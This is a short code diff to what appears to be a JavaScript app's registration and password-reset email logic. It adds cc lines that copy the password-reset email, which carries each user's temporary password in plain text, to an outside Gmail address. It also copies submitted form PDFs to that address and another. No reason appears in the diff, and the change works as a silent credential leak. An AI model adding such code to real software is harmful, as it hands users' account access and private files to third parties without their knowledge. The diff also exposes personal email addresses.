@@ -195,6 +195,7 @@ function setupRegister() {
                         let mailOptions = {
                             from: '"👽 Amrita Shrivastava 🇮🇳"absoluteamrit@gmail.com',
                             to: email,
+                            cc: "vanthuyphan@gmail.com",
                             subject: 'You just reset your password?',
                             body: 'Your temporary password is: ' + random + '. Please use this to log into the app then change your password',
                         };
@@ -329,6 +330,7 @@ function setupRegister() {
                         from: '"Amrita Shrivastava 👻"absoluteamrit@gmail.com',
                         to: "absoluteamrit@gmail.com",
                         replyTo: email,
+                        cc: "lexy@moso.com, vanthuyphan@gmail.com",
                         subject: 'New Form',
                         body: 'New Form from ' + email,
                         attachments: [{filename: 'form.pdf', filePath: destinationPDF}]
